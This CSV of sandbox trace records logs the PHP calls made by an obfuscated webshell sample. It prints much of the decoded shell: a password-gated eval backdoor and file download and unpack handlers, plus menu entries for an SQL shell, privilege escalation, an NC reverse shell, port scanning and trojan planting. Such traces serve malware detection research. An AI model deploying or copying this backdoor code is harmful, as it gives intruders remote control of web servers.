uuid,file_md5,index,source,target,argc,argv,return,dynamic
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,10,__lambda_func,gzinflate,1.0,"{""value"": [[0, ""data"", ""\\xec\\xfd\\xf9w\\\\xd7u'\\x8a\\xffL\\xaf\\xe5\\xff\\xe1\\xaa\f\\xab\\x00\\xab\\x00\\xdey \\x04Zw\\x94(q2Aj$\\x1f^\\x01(\\x80%\\x02(\\x18U\\xe0 \\x8a\\x7f\\x8c\\x93\\xee\\x17=wz\\xc5\\x925\\xd8\\x96d\\xc5\\x92l\\xc9\\xf2 Y\\x92e\\xc7+\\xe9N\\xdc\\xe9t\\xa7\\xf5\\xdc\\xaf3t&'\\xbd\\xbe\\x9f\\xcf>\\xf7\\xde\\xba\\xb7\\x06\\x10\\x94\\xed\\xe4e}\\x1b\\x12\\x81\\xaa{\\xcf|\\xf6\\xd9\\xf3\\xde\\xa7\\xb7\\xba\\xd2\\x1f\\xb4\\xf7\\x06\\xb3s\\x8b\\x9f\\xfe\\xd4zg\\xa3\\xbb""]]}","{""value"": ""ob_start();\r\ndefine('myaddress',$_SERVER['SCRIPT_FILENAME']);\r\ndefine('envlpass',$password);\r\ndefine('shellname',$shellname);\r\ndef""}",[0]
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,11,__lambda_func,eval,1.0,"{""value"": [[0, ""phpcode"", ""ob_start();\r\ndefine('myaddress',$_SERVER['SCRIPT_FILENAME']);\r\ndefine('envlpass',$password);\r\ndefine('shellname',$shellname);\r\ndef""]]}","{""value"": null}",[0]
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,12,eval,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""ob_start();\r\ndefine('myaddress',$_SERVER['SCRIPT_FILENAME']);\r\ndefine('envlpass',$password);\r\ndefine('shellname',$shellname);\r\ndefine('myurl',$myurl);\r\nif(@get_magic_quotes_gpc()){\r\n\tforeach($_POST as $k => $v) $_POST[$k] = stripslashes($v);\r\n\tforeach($_GET as $k => $v) $_GET[$k] = stripslashes($v);\r\n}\r\nif(isset($_REQUEST[envlpass])){\r\nhmlogin(2);\r\n@eval($_REQUEST[envlpass]);\r\nexit;}\r\nif($_COOKIE['envlpass'] != md5(envlpass)){\r\n\tif($_POST['envlpass']){\r\n\t\tif($_POST['envlpass'] == envlpass){\r\n\t\t\tsetcookie('envlpass',md5($_POST['envlpass']));\r\n\t\t\thmlogin();\r\n\t\t}else{\r\n\t\t\techo '<CENTER>\\xd3\\xc3\\xbb\\xa7\\xbb\\xf2\\xc3\\xdc\\xc2\\xeb\\xb4\\xed\\xce\\xf3</CENTER>';\r\n\t\t}\r\n\t}\r\n\tislogin($shellname,$myurl);\r\n\texit;\r\n}\r\n/*---End Login---*/\r\nif(isset($_GET['down'])) do_down($_GET['down']);\r\nif(isset($_GET['pack'])){\r\n\t$dir = do_show($_GET['pack']);\r\n\t$zip = new eanver($dir);\r\n\t$out = $zip->out;\r\n\tdo_download($out,\""eanver.tar.gz\"");\r\n}\r\nif(isset($_GET['unzip'])){\r\n\tcss_main();\r\n\tstart_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);\r\n\texit;\r\n}\r\n\r\ndefine('root_dir',str_replace('\\\\','/',dirname(myaddress)).'/');\r\ndefine('run_win',substr(PHP_OS, 0, 3) == \""WIN\"");\r\ndefine('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));\r\n$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : \""\"";\r\n$doing = isset($_POST['doing']) ? $_POST['doing'] : \""\"";\r\n$path = isset($_GET['path']) ? $_GET['path'] : root_dir;\r\n$name = isset($_POST['name']) ? $_POST['name'] : \""\"";\r\n$img = isset($_GET['img']) ? $_GET['img'] : \""\"";\r\n$p = isset($_GET['p']) ? $_GET['p'] : \""\"";\r\n$pp = urlencode(dirname($p));\r\nif($img) css_img($img);\r\nif($eanver == \""phpinfo\"") die(phpinfo());\r\nif($eanver == 'logout'){\r\n\tsetcookie('envlpass',null);\r\n\tdie('<meta http-equiv=\""refresh\"" content=\""0;URL=?\"">');\r\n}\r\n\r\n$class = array(\r\n\""\\xd0\\xc5\\xcf\\xa2\\xb2\\xd9\\xd7\\xf7\"" => array(\""upfiles\"" => \""\\xc9\\xcf\\xb4\\xab\\xce\\xc4\\xbc\\xfe\"",\""phpinfo\"" => \""\\xbb\\xf9\\xb1\\xbe\\xd0\\xc5\\xcf\\xa2\"",\""info_f\"" => \""\\xcf\\xb5\\xcd\\xb3\\xd0\\xc5\\xcf\\xa2\"",\""eval\"" => \""\\xd6\\xb4\\xd0\\xd0PHP\\xbd\\xc5\\xb1\\xbe\""),\r\n\""\\xcc\\xe1\\xc8\\xa8\\xb9\\xa4\\xbe\\xdf\"" => array(\""sqlshell\"" => \""\\xd6\\xb4\\xd0\\xd0SQL\\xd6\\xb4\\xd0\\xd0\"",\""mysql_exec\"" => \""MYSQL\\xb2\\xd9\\xd7\\xf7\"",\""myexp\"" => \""MYSQL\\xcc\\xe1\\xc8\\xa8\"",\""servu\"" => \""Serv-U\\xcc\\xe1\\xc8\\xa8\"",\""nc\"" => \""NC\\xb7\\xb4\\xb5\\xaf\"",\""linux\"" => \""Linux\\xb7\\xb4\\xb5\\xaf\"",\""downloader\"" => \""\\xce\\xc4\\xbc\\xfe\\xcf\\xc2\\xd4\\xd8\"",\""port\"" => \""\\xb6\\xcb\\xbf\\xda\\xc9\\xa8\\xc3\\xe8\""),\r\n\""\\xc5\\xfa\\xc1\\xbf\\xb2\\xd9\\xd7\\xf7\"" => array(\""guama\"" => \""\\xc5\\xfa\\xc1\\xbf\\xb9\\xd2\\xc2\\xed\\xc7\\xe5\\xc2\\xed\"",\""tihuan\"" => \""\\xc5\\xfa\\xc1\\xbf\\xcc\\xe6\\xbb\\xbb\\xc4\\xda\\xc8\\xdd\"",\""scanfile\"" => \""\\xc5\\xfa\\xc1\\xbf\\xcb\\xd1\\xcb\\xf7\\xce\\xc4\\xbc\\xfe\"",\""scanphp\"" => \""\\xc5\\xfa\\xc1\\xbf\\xb2\\xe9\\xd5\\xd2\\xc4\\xbe\\xc2\\xed\""),\r\n\""\\xbd\\xc5\\xb1\\xbe\\xb2\\xe5\\xbc\\xfe\"" => array(\""getcode\"" => \""\\xbb\\xf1\\xc8\\xa1\\xcd\\xf8\\xd2\\xb3\\xd4\\xb4\\xc2\\xeb\"")\r\n);\r\n$msg = array(\""0\"" => \""\\xb1\\xa3\\xb4\\xe6\\xb3\\xc9\\xb9\\xa6\"",\""1\"" => \""\\xb1\\xa3\\xb4\\xe6\\xca\\xa7\\xb0\\xdc\"",\""2\"" => \""\\xc9\\xcf\\xb4\\xab\\xb3\\xc9\\xb9\\xa6\"",\""3\"" => \""\\xc9\\xcf\\xb4\\xab\\xca\\xa7\\xb0\\xdc\"",\""4\"" => \""\\xd0\\xde\\xb8\\xc4\\xb3\\xc9\\xb9\\xa6\"",\""5\"" => \""\\xd0\\xde\\xb8\\xc4\\xca\\xa7\\xb0\\xdc\"",\""6\"" => \""\\xc9\\xbe\\xb3\\xfd\\xb3\\xc9\\xb9\\xa6\"",\""7\"" => \""\\xc9\\xbe\\xb3\\xfd\\xca\\xa7\\xb0\\xdc\"");\r\ncss_main();\r\nswitch($eanver){\r\n\tcase \""left\"":\r\n\tcss_left();\r\n\t\thtml_n(\""<dl><dt><a href=\\\""#\\\"" onclick=\\\""showHide('items1');\\\"" target=\\\""_self\\\"">\"");\r\n\t\thtml_img(\""title\"");html_n(\"" \\xb1\\xbe\\xb5\\xd8\\xd3\\xb2\\xc5\\xcc</a></dt><dd id=\\\""items1\\\"" style=\\\""display:block;\\\""><ul>\"");\r\n    $ROOT_DIR = File_Mode();\r\n    html_n(\""<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>\\xcd\\xf8\\xd5\\xbe\\xb8\\xf9\\xc4\\xbf\\xc2\\xbc</a></li>\"");\r\n\thtml_n(\""<li><a href='?eanver=main' target='main'>\\xb1\\xbe\\xb3\\xcc\\xd0\\xf2\\xc4\\xbf\\xc2\\xbc</a></li>\"");\r\n\tfor ($i=66;$i<=90;$i++){$drive= chr($i).':';\r\n    if (is_dir($drive.\""/\"")){$vol=File_Str(\""vol $drive\"");if(empty($vol))$vol=$drive;\r\n    html_n(\""<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>\\xb1\\xbe\\xb5\\xd8\\xb4\\xc5\\xc5\\xcc($drive)</a></li>\"");}}\r\n\thtml_n(\""</ul></dd></dl>\"");\r\n\t$i = 2;\r\n\tforeach($class as $name => $array){\r\n\t\thtml_n(\""<dl><dt><a href=\\\""#\\\"" onclick=\\\""showHide('items$i');\\\"" target=\\\""_self\\\"">\"");\r\n\t\thtml_img(\""title\"");html_n(\"" $name</a></dt><dd id=\\\""items$i\\\"" style=\\\""display:block;\\\""><ul>\"");\r\n\t\tforeach($array as $url => $value){\r\n\t\t\thtml_n(\""<li><a href=\\\""?eanver=$url\\\"" target='main'>$value</a></li>\"");\r\n\t\t}\r\n\t\thtml_n(\""</ul></dd></dl>\"");\r\n\t\t$i++;\r\n\t}\r\n\thtml_n(\""<dl><dt><a href=\\\""#\\\"" onclick=\\\""showHide('items$i');\\\"" target=\\\""_self\\\"">\"");\r\n\thtml_img(\""title\"");html_n(\"" \\xc6\\xe4\\xcb\\xfc\\xb2\\xd9\\xd7\\xf7</a></dt><dd id=\\\""items$i\\\"" style=\\\""display:block;\\\""><ul>\"");\r\n\thtml_n(\""<li><a title='\\xc3\\xe2\\xc9\\xb1\\xb8\\xfc\\xd0\\xc2' href='http://webhack.cn' target=\\\""main\\\"">\\xc3\\xe2\\xc9\\xb1\\xb8\\xfc\\xd0\\xc2</a></li>\"");\r\n    html_n(\""<li><a title='\\xb0\\xb2\\xc8\\xab\\xcd\\xcb\\xb3\\xf6' href='?eanver=logout' target=\\\""main\\\"">\\xb0\\xb2\\xc8\\xab\\xcd\\xcb\\xb3\\xf6</a></li>\"");\r\n\thtml_n(\""</ul></dd></dl>\"");\r\n\thtml_n(\""</div>\"");\r\n\tbreak;\r\n\t\r\n\tcase \""main\"":\r\n\tcss_js(\""1\"");\r\n\t$dir = @dir($path);\r\n\t$REAL_DIR = File_Str(realpath($path));\r\n\tif(!empty($_POST['actall'])){ech""]]}","{""value"": ""3C415051423C41423C41423C41423C393C3A2B504D4E892626423C5393892A31504D4E892626423C5393892A312A6359732B3B413D39635051493A4F2A505163413C122B50512B505163112B415051423C6A3C3B3D2A282A3B42423D4F2A59732B3B5C5D423D2A59732B3B5C5D423D266D44423D2652263B42413D2A59732B3B3D3B5C5D425C5D425C5D423D4F2A41414163413C6A3C08413C414141413C11413C413B63505108413D6A3C59732B50519D2A9D2659732B50519D2A9D2659732B50519D2A639D2659732B50519D2A9D2659732B50519D2A9D2659732B50519D2A9D26423C6A3C262B3B423D2A112B3C4F2A112B41413C4F2A474848484747484848484848484847484848484748264748484848484848263B3D302B3B3D3B413D3B413D3B413D3B3D263B3738373837413D3B413D26142D24462A423C082608413C2B3B3738413D26722B262A3B37383738373837413D2A2A3B413D264D4E8926263B373837413D3B413D3B3638373837413D4D4E8926263B3738373837413D2A313B413D24462A313B373837413D3B413D3B373837413D3B413D3B413D3B413D3B413D322A302B3B413D3950423C3A263B423C6A3D2659730D2B3B5C5D425C5D425C5D42423D0808282A262650510D2B262A50510808263B3D263B413D3B373837413D3B423C0808413D3B423C0808423C0808413D3B414141413D3B4141413D59730D2B59732B5051262A264141413C142B5051112F505111342B2A415051425051423C5393892A3B5C5D42425C5D423D2B505108085108162A505108085108162839505142395051423C3A6A3C3A2A3B0808413D3B3B423D0841413D3B413D3B413D3950703D3A262B112F11342B332A3B383638413D26423C2B423C6A41413C6A413C2639413950423C3A6A3C3A26423C263B0808413D3B413D3B0841423D3B413D3B3738373837413D3B3738373837413D3B0841413D3B413D3B08080841423D3B0808413D3B413D24462A2A3950703D3A3950703D3A262B112F11342B332A3B383638413D26423C0D2B3950423C3A263B423D26423C6A41413C6A413C2639413950423C3A6A3C3A263B08413D6A42423C260826423C2642413C263B0808413D3B3B423D6A3D3B42423D3B413D112F11342F11342F11342B3B084141080808080808413D2A3B0841410808413D3B3738373837413D3B3738373837413D3B423C0837383708413D3B413D3B08080841423D3B0808413D3B0841420808413D3B413D24462A2A3950703D3A0D2B413C0301413C262A373837383750513837383738372946322A302B3B413D59730D2B39505151423B0850515108413D6A3C3A2B3B41505151085108413D9D2A3B5D423D9D28423C08084F2A59730D2B5051263B0808413D26395042413C3A2B3B41085108413D9D2A3B5D423D9D46423C08084F2A59730D2B5051260808413C26423C263B0808413D262626413C0301413C263950423C3A2B282A2A423C2641423C6A3C263950423C3A264141413C142B59732B3B423D132B264141423C262A262A5051112B262A50512650514241423C262A423C263738373837383738373837383729463B47484848484848484142373837413D373837383738372946322A302B3B413D423C085051423C0826395042423C3A2B3B3738415051423C085108413D9D2A3B5D423D9D4608084F322A302B3B413D3B423D2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B413D3950423C3A2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B413D415051423C2651938926423C132D24462A51423C93892A41423C26395042423C3A2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B0808413D423C2B3B474848415C5D423D2A3B474848415C5D423D3B4141413D3B3D50512B5051302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A312B3B3738415D423D9D2A3B5D423D9D4608084F2A3B413D322A302B413C26413C2B413C9D2A9D2659732B5051080850510808162A413C0808413C08081626112B262A4141423C264141423C2641423C0D2B162A162647413C6A3C48474750510808505108084848475051423C48484748484750514848475051484847505148484750514848473C6A3C4848474848473B413D484847484847634848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848474848473B413D08484847484847484847413C0304413C084848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848266D44413D262F4F34462826423C132D24462A515108085151080808282A70413D2670413D2670413D262A6B08080828080808280808082828322A302B59732B50519D2A50519D2659732B50519D2A9D263738373837294659730D2E59730D342B28505126505126424243433C260D2B262A42413C423C0D2B42413C42413C2638413C26420808413C2A423C282A322A302B59732B50519D2A413C9D2659732B50519D2A9D26373837294659730D2E59730D342B285051112B080808080808263B41423C6A413D2B162A16283B413D262B423C9D2A9D263B085051080850510808413D2B505108162A16282A5051112B08080808080808263B41423C6A413D2B162A16283B413D2639413C3A3B505108085051080841""}",[0]
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,13,eval,ob_start,0.0,"{""value"": []}","{""value"": ""void""}",[]
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,14,eval,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,15,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""myaddress""], [1, ""value"", ""/usr/share/nginx/html/444e688b883127d8bb4571780e5678e2_5ff9a612-8430-4ac9-9ffe-5c0cd3fbe347.php""]]}","{""value"": ""void""}","[0, 0]"
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,16,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""envlpass""], [1, ""value"", ""a""]]}","{""value"": ""void""}","[0, 0]"
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,17,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""shellname""], [1, ""value"", ""\\xcd\\xf8\\xd5\\xbe\\xb0\\xb2\\xc8\\xab\\xbc\\xec\\xb2\\xe2""]]}","{""value"": ""void""}","[0, 0]"
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,18,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""myurl""], [1, ""value"", ""http://wy886.cn""]]}","{""value"": ""void""}","[0, 0]"
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,19,eval,get_magic_quotes_gpc,0.0,"{""value"": []}","{""value"": false}",[]
92f2fd60bd3d29ea0a488993fde14455,444e688b883127d8bb4571780e5678e2,20,eval,zend_fetch_r_cookie,1.0,"{""value"": [[0, ""op1"", ""_COOKIE""]]}","{""value"": []}",[0]
